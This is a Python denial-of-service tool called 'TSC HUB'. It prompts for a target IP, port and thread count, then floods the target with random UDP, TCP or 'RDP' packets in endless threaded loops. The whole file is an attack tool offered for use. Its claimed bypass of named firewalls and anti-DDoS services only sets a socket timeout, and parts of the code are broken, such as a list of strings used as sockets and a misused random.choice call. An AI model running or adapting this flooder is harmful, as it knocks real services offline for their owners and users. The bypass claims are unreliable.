#!/usr/bin/env python3

import random
import socket
import threading
import time
print("                                     ______________________")
print("                                                          ")
print("                                           TSC  HUB       ")
print("                                         1. UDP FLOOD     ")
print("                                         2. TCP FLOOD     ")
print("                                         3. RAN SOCK      ")
print("                                         4. RDP FLOOD     ")
print("                                     ______________________")
print("                                                          ")
print("                                          BYPASS TSC      ")
print("                                         1. CSNE FIREWALL ")
print("                                         2. ANTI DDOS GUARDIAN (BEE)     ")
print("                                     ______________________")
print("                                                          ")
print("                                                          ")

cla = int(input("                                PACKET:"))
bypass = int(input("                                BYPASS:"))
ip = str(input("                                IP:"))
port = int(input("                                PORT:"))      # The port used by the server
threads = int(input("                                TIME:"))

def ran_sock():
	global sock
	sock=[]
	sock.append("socket.socket(socket.AF_INET, socket.SOCK_DGRAM)")
	sock.append("socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
	sock.append("socket.socket(socket.AF_INET, socket.SOCK_DGRAM)")
	sock.append("socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
	return(sock)
    
def run():
	data = random._urandom(1010)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			if(bypass == 1):
				s.settimeout(1000)
			if(bypass == 2):
				s.settimeout(120000)
			addr = (str(ip),int(port))
			for x in range(3000):
				s.sendto(data,addr)

			print(f"                                ATTACK {ip}:{port} BY PACKET UDP FLOOD")
		except:
			print(f"                                SERVER {ip}:{port} DOWN BY PACKET UDP FLOOD")

def run2():
	data = random._urandom(65535)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			if(bypass == 1):
				s.settimeout(1000)
			if(bypass == 2):
				s.settimeout(120000)
			for x in range(600):
				s.connect(addr)
				s.send(data)

			print(f"                                ATTACK {ip}:{port} BY PACKET TCP FLOOD")
		except:
			print(f"                                SERVER {ip}:{port} DOWN BY PACKET TCP FLOOD")

def run3():
	ran_sock()
	data = random._urandom(1010)
	while True:
		try:
			s = random.choice(sock)
			addr = (str(ip),int(port))
			if(bypass == 1):
				s.settimeout(1000)
			if(bypass == 2):
				s.settimeout(120000)
			for x in range(1):
				s.connect(addr)
				s.send(data)
				s.sendto(data,addr)
		except:
			print(f"                                SERVER {ip}:{port} DOWN BY PACKET RAN SOCKET")
			time.sleep(.8)
			
def run4():
	data = random._urandom(1024)
	data2 = random._urandom(512)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			if(bypass == 1):
				s.settimeout(1000)
			if(bypass == 2):
				s.settimeout(120000)
			for x in range(1):
				s.connect(addr)
				s.send(random.choice(data,data2))
		except:
			print(f"                                SERVER {ip}:{port} DOWN BY PACKET RDP FLOOD")
			time.sleep(.8)

for Y in range(threads):
		if(cla == 1):
			th1 = threading.Thread(target = run)
			th1.start()
		if(cla == 2):
			th1 = threading.Thread(target = run2)
			th1.start()
		if(cla == 3):
			th1 = threading.Thread(target = run3)
			th1.start()
		if(cla == 4):
			th1 = threading.Thread(target = run4)
			th1.start()
